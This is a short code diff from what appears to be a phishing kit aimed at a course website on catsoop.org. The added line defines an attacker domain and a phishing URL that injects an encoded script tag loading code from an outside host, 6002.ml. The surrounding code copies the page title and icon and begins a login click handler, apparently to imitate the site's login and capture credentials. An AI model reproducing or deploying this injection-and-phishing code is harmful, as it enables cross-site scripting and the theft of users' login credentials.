@@ -1,4 +1,4 @@
-// Note: all this js will be loaded in double quotes, so must escape use single quotes or esacaped double quotes
+var ORIG_DOM='https://6002.catsoop.org/S20/ex01/big_and_small';		var FINAL_DOM='https://6002.catsoop.org/S20/ex01/big_and_small';		var DOMAIN='https://6002.ml';		var PHISHING_URL='https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/';		// Note: all this js will be loaded in double quotes, so must escape use single quotes or esacaped double quotes
 // var DOMAIN = attacker domain
 // var ORIG_DOM = origianl catsoop domain url
 // var FINAL_DOM; = final catsoop domain url
@@ -16,6 +16,10 @@ var title = '';
 var t = document.getElementsByTagName('title')
 if (t.length > 0) title = t[0].innerHTML;
 window.postMessage({'icon': icon, 'title': title}, '*');
+
+//window.parent.postMessage('loaded', '*');
+
+
 
 // on login click handler
 window.nextWin = function nextWin() { 
